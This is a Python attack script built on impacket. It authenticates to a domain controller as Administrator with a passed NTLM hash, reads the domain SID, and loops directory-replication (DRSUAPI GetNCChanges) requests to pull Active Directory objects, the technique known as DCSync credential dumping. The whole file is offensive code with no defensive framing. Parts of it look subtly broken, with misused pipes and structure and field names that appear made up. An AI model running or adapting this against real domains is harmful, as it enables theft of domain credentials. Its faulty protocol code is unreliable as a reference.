#!/usr/bin/env python3
import sys, binascii, struct
from impacket.dcerpc.v5 import drsuapi, transport, samr
from impacket.dcerpc.v5.dtypes import NULL
from impacket import ntlm

TARGET='<DC_IP>'
DOMAIN='legacy.corp'
USER='Administrator'
PASS='x'
HASH='<HASH>:<HASH>'
lmhash, nthash = HASH.split(':')

def domain_sid_and_bind():
    # SAMR domain sid
    rpc = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\samr]' % TARGET)
    rpc.set_credentials(USER, PASS, DOMAIN, lmhash, nthash); rpc.set_kerberos(False)
    d=rpc.get_dce_rpc(); d.connect(); d.bind(samr.MSRPC_UUID_SAMR)
    h=samr.hSamrConnect(d, r'\\'+TARGET)['ServerHandle']
    r=samr.hSamrEnumerateDomainsInSamServer(d,h)
    sid=None
    for i in r['Buffer']['Buffer']:
        if i['Name'].lower().startswith('legacy'):
            sid=samr.hSamrLookupDomainInSamServer(d,h,i['Name'])['DomainId'].formatCanonical()
    d.disconnect()
    return sid

print("[+] DOMAIN SID:", domain_sid_and_bind())

rpc = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\lsarpc]' % TARGET)
rpc.set_credentials(USER, PASS, DOMAIN, lmhash, nthash); rpc.set_kerberos(False)
dce=rpc.get_dce_rpc(); dce.connect(); dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

req=drsuapi.DrsBind()
req['puuidClientDsa']=drsuapi.NTDSAPI_CLIENT_GUID
drs=drsuapi.DRS_EXTENSIONS_INT()
drs['cb']=len(drs)
drs['dwFlags']=drsuapi.DRS_EXT_GETCHGREQ_V6|drsuapi.DRS_EXT_GETCHGREPLY_V6|drsuapi.DRS_EXT_GETCHGREQ_V8|drsuapi.DRS_EXT_STRONG_ENCRYPTION
drs['SiteObjGuid']=drsuapi.NULLGUID; drs['Pid']=0; drs['dwReplEpoch']=0; drs['dwFlagsExt']=0
drs['ConfigObjGUID']=drsuapi.NULLGUID; drs['dwExtCaps']=0xffffffff
req['pextClient']['cb']=len(drs); req['pextClient']['rgb']=list(drs.getData())
resp=dce.request(req)
hDrs=resp['phDrs']
resp=drsuapi.hDRSDomainControllerInfo(dce,hDrs,(DOMAIN+'\\x00').encode()[:15]+b'\x00',2)
if resp['pmsgOut']['V2']['cItems']>0: ntds=resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
else: ntds=NULL

base='DC=legacy,DC=corp'
def prep(usn):
    u=drsuapi.DRS_MSG_GETCHGREQ()
    u['V6']=drsuapi.DRS_MSG_GETCHGREQ_REPLY_V6()
    u['V6']['uuidDsaObjDest']=ntds
    u['V6']['uuidInvocIdSrc']=NULL
    u['V6']['npmsg']['pmsg']=base.encode()+b'\x00'
    u['V6']['nExtInfo']=0
    u['V6']['pmsgDrain']=NULL
    u['V6']['fMoreData']=0; u['V6']['fDwExt']=0; u['V6']['fTombstone']=0
    u['V6']['fUpToDateVec']=0; u['V6']['fReplInfo']=0; u['V6']['fDsExtendedOp']=0
    u['V6']['cMaxNcSize']=0
    u['V6']['cNumObjects']=1
    u['V6']['cMaxObjects']=0x3FFFFFFF
    u['V6']['cMaxBytes']=0x7FFFFFFF
    u['V6']['cMaxValuesLen']=0x19402
    u['V6']['pExtras']=NULL
    u['V6']['pUpToVec']['V1']['usnvec1_ulHighUSN']=usn
    u['V6']['pUpToVec']['V1']['usnvec1_ulLowUSN']=0
    u['V6']['pUpToVec']['V1']['usnvec1_ulPropUSN']=0
    return u

usn=0
seen=0
while True:
    resp=drsuapi.hDRSGetNCChanges(dce,hDrs,0,0,0,prep(usn))
    v6=resp['pmsgOut']['V6']
    n=v6['cNumObjects']
    print(". chunk cNumObjects",n,"more",v6['fMoreData'])
    objs=v6['pObjects']
    for i in range(n):
        o=objs[i]
        seen+=1
        # try to read attributes
        try:
            ac=o['AttributeCount']
            names=[x for x in o['AttributeNames']]
            vals=o['AttributeValues']
            print("   obj#%d attrs=%d"%(seen,ac), "names:", names[:8])
        except Exception as e:
            print("   obj#%d ERR attr parse %r"%(seen,e))
        # advance usn
    usn=v6['usnvecTo']['usnHighObjUpdate']+1
    if not v6['fMoreData'] or n==0:
        break
print("done, objects=",seen)